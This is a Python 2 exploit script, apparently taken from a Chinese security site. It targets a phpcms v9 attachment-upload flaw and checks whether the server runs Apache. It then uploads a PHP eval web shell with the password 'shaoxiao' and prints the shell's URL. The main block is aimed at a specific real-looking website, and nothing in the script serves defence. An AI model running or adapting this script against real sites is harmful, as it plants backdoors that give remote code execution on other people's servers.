#coding=gb2312
#http://www.2cto.com/Article/201108/100720.html
#aspcms注入漏洞及后台文件权限未验证
#http://www.wooyun.org/bugs/wooyun-2013-019299
import re
import urllib2
import httplib

class phpcmsv9getshell:
    def scan(self,arg):
        try:
            html = urllib2.urlopen(arg,timeout=10).info()['Server']
            if 'pache' in html:  #判断是否安装了apache
                self.dir(arg)
            else:
                print '\n亲！此网站不是apache的网站!'
        except Exception,e:
            print e
        
    def dir(self,arg):#创建个文件
        headers = {'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)','Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}
        data = 'i am just test'
        url = arg.split('//')[1]
        site = '/index.php?m=attachment&c=attachments&a=crop_upload&width=6&height=6&file=shaoxiao.jpg'
        conn = httplib.HTTPConnection(url)
        conn.request('POST',site,data,headers)
        httpres = conn.getresponse()
        html = httpres.read()
        if html:
            self.getshell(arg)
    
    def getshell(self,arg):
        headers = {'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)','Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}
        data = "test<?php @eval($_POST[\''.'shaoxiao'.'\']);?>'"
        url = arg.split('//')[1]
        site = '/index.php?m=attachment&c=attachments&a=crop_upload&width=6&height=6&file=http://www.sttc.cn/uploadfile/1222.thumb_.Php.JPG%20%20%20%20%20%20%20Php'
        conn = httplib.HTTPConnection(url)
        conn.request('POST',site,data,headers)
        httpres = conn.getresponse()
        html = httpres.read()        
        print html
        if httpres.status == 200 and html:
            gets = re.compile('http://(.*?)\.Php\.JPG\s')
            get = gets.findall(html)
            if get:
                print 'Shell: http://'+get[0]+'%20%20%20%20%20%20%20Php  Pass:shaoxiao'
            
    
if __name__ == '__main__':
    x = phpcmsv9getshell()
    x.scan('http://www.sttc.cn')
    #x.scan('http://www.anquan.com.cn')
        
    
    
